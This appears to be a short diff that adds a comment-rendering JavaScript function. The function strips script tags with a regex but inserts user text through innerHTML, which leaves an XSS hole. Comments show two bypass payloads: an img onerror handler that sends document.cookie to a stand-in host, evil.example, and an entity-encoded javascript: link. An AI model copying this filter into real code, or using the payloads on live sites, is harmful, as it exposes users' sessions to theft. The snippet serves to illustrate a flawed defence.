@@ -1,0 +1,9 @@
+function renderComment(comment) {
+  // Strip <script> tags before rendering user comments
+  const cleaned = comment.replace(/<script.*?>.*?<\/script>/gi, '');
+  document.getElementById('comments').innerHTML += `<div class="comment">${cleaned}</div>`;
+}
+
+// Example comment submitted by a user:
+// <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
+// <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
